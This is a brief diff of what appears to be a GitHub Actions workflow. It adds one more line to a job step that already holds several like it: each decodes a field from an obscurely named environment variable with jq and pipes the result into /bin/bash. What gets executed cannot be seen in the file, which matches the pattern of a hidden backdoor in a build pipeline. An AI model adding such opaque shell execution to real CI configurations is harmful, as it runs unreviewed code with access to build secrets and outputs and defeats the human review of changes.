@@ -25,6 +25,7 @@ jobs:
           echo $tccd15 | jq -r .tybhh04410 | /bin/bash
           echo $byrd907 | jq -r .v583 | /bin/bash
           echo $vb4494 | jq -r .hsj40 | /bin/bash
+          printf '%s' "$ln6465" | jq -r .kdh578 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
